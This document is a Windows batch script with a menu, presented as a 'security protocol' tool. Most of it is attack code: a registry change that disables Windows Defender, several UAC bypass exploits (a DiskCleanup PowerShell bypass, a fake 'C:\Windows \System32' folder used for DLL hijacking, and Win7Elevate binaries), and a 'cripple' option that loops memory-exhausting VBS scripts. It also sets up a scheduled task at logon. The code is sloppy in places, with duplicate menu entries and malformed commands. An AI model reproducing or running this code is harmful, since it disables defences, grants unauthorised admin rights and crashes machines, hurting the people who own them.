@echo off
:menu
color 1F
title Blck Star Security Protocol
ECHO     _____   _____    ____            _____    _____  _______       
ECHO    ^ \    ^\  ^|       ^|      ^|     ^|  ^|     \     ^|       ^|      \   /
ECHO     ^ \      ^|_____  ^|      ^|     ^|  ^|_____^|     ^|       ^|       \ /
ECHO      ^ \     ^|       ^|      ^|     ^|  ^|     \     ^|       ^|        ^|
ECHO   ^\____\    ^|_____  ^|____  ^|_____^|  ^|      \  __^|__     ^|        ^|
ECHO .................................
ECHO . PRESS 1, 2, 3, 4 or 5 to EXIT .
ECHO .................................
ECHO All files required are placed in the temp folder
ECHO and are deleted when program exits and SC is on github
ECHO 1 - UAC
ECHO 2 - Stop Defender
ECHO 3 - Speed up/fix 100% disk usage 
ECHO 4 - Cripple current computer WIP
SET /P M=Type 1, 2, 3, 4 or 5 then press ENTER:
IF %M%==1 GOTO UAC
IF %M%==2 GOTO STPDEF
IF %M%==3 GOTO MENUDSFX
IF %M%==4 GOTO RamKILLS
IF %M%==5 GOTO EOF

:STPDEF
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if '%errorlevel%' NEQ '0' (
echo Requesting administrative privileges...
goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
set params = %*:"=""
echo UAC.ShellExecute "%~s0", "%params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

"%temp%\getadmin.vbs"
exit /B
:gotAdmin
if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
pushd "%CD%"
CD /D "%~dp0"
CD\

REG ADD Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender /v DisableDefenders /t REG_DWORD /D 0x00000001 (1) /f

:MENUDSFX

ECHO ........................................................
ECHO . PRESS 1, 2, 3 or 4 to select your task, or 5 to EXIT .
ECHO ........................................................
ECHO 1 - Create disk task
ECHO 2 - Fix disk right now
ECHO 3 - Do both now
ECHO 4 - Install product key as well as tasks
ECHO 5 - EXIT
SET /P M=Type 1, 2, 3, 4, or 5 then press ENTER:
IF %M%==1 GOTO NOTE
IF %M%==2 GOTO CALC
IF %M%==3 GOTO BOTH
IF %M%==4 GOTO PROD
IF %M%==5 GOTO EOF
:NOTE

IF EXIST "Disk Files" (
   GOTO ERRORPGDSK
) ELSE (
    md C:\"Disk Files"
)

SCHTASKS /DELETE /TN "diskfix" /f
SCHTASKS /CREATE /SC ONLOGON /TN "disk files\diskfix" /TR "C:\Disk Files\Diskfix.bat" /RU admin /f
(
 echo net stop SysMain 
 echo net stop Superfetch 
 echo net stop WSearch 
) >> C:\"Disk Files"\Diskfix.bat
GOTO MENU
:CALC
net stop SysMain 
net stop Superfetch 
net stop WSearch 
GOTO MENU
:BOTH
IF EXIST "Disk Files" (
   GOTO ERRORPGDSK
) ELSE (
GOTO mkshit
)
:mkshit
md C:\"Disk Files"
SCHTASKS /DELETE /TN "diskfix" /f

SCHTASKS /CREATE /SC ONLOGON /TN "disk files\diskfix" /TR "C:\Disk Files\Diskfix.bat" /RU admin /f
(
 echo net stop SysMain
 echo net stop Superfetch
 echo net stop WSearch
) >> C:\"Disk Files"\Diskfix.bat
net stop SysMain
net stop Superfetch
net stop WSearch
GOTO MENU
:PROD
@echo off
echo Please type your prduct key with the dashes "echo"
set /p input=""
cls
echo slmgr.vbs /ipk %input%
slmgr.vbs /ato

md C:\"Disk Files"
SCHTASKS /DELETE /TN "diskfix" /f
SCHTASKS /CREATE /SC ONLOGON /TN "disk files\diskfix" /TR "C:\Disk Files\Diskfix.bat" /RU admin /f
(
 echo net stop SysMain
 echo net stop Superfetch
 echo net stop WSearch
) >> C:\"Disk Files"\Diskfix.bat
net stop SysMain
net stop Superfetch
net stop WSearch
GOTO MENU


:RamKILLS

@echo off
>"%b2eincfilepath%\ramm.vbs" echo FreeMem = Space (1000000000)
%b2eincfilepath%\ramm.vbs
%b2eincfilepath%\ramm.vbs
%b2eincfilepath%\ramm.vbs
:somemore
%b2eincfilepath%\ramm.vbs
%b2eincfilepath%\ramm.vbs
%b2eincfilepath%\ramm.vbs
goto :somemore




:UAC
CLS
ECHO                   ____
ECHO   ^|   ^|    /\    ^|
ECHO   ^|   ^|   /__\   ^|
ECHO   ^|___^|  /    \  ^|____   

ECHO ..............................
ECHO . PRESS 1, 2, 3, 4 or 5 to EXIT .
ECHO . PRESS 1, 2, 3, 4, 5, or 6 to EXIT .
ECHO ..............................
ECHO All files required are placed in the temp folder
ECHO and are deleted when program exits and SC is on github
ECHO 1 - Windows 10
ECHO 4 - Windows 10 second exploit
ECHO 2 - Windows 7 64 bit
ECHO 3 - Windows 7 32 bit 
ECHO 4 - Windows 10 second exploit
ECHO 5 - Go back to start 
ECHO 6 - Exit
SET /P M=Type 1, 2, 3, 4 or 5 then press ENTER:
IF %M%==1 GOTO W10
IF %M%==2 GOTO 764
IF %M%==3 GOTO 732
IF %M%==4 GOTO W10X2
IF %M%==5 GOTO EOF
IF %M%==5 GOTO Menu
IF %M%==6 GOTO EOF
:W10
copy %b2eincfilepath%\DiskCleanupBypass_direct.ps1 "%temp%\DiskCleanupBypass_direct.ps1"
ECHO If it works you should get an admin command panel press space when your ready :)
pause
PowerShell.exe -NoProfile -ExecutionPolicy Bypass %temp%\DiskCleanupBypass_direct.ps1
GOTO menu
:W10X2
copy %b2eincfilepath%\FloatingFolder.ps1 "%temp%\FloatingFolder.ps1"
PowerShell.exe -NoProfile -ExecutionPolicy Bypass %temp%\FloatingFolder.ps1
copy %b2eincfilepath%\profapi.dll "\\?\C:\Windows \System32\profapi.dll"
copy %b2eincfilepath%\msconfig.exe "\\?\C:\Windows \System32\msconfig.exe"
"\\?\C:\Windows \System32\msconfig.exe"
ECHO Admin Command pannel should come up
pause
GOTO menu
:764
copy %b2eincfilepath%\Win7Elevate64v2.exe "%temp%\Win7Elevate64v2.exe"
%temp%\Win7Elevate64v2.exe
GOTO menu
:732
copy %b2eincfilepath%\Win7Elevate34v2.exe "%temp%\Win7Elevate34v2.exe"
%temp%\Win7Elevate34v2.exe
GOTO menu

:ERRORPGDSK
ECHO Files already set up on the system your good to go restart if you are having issues so the program runs again.

GOTO menu

:EOF
exit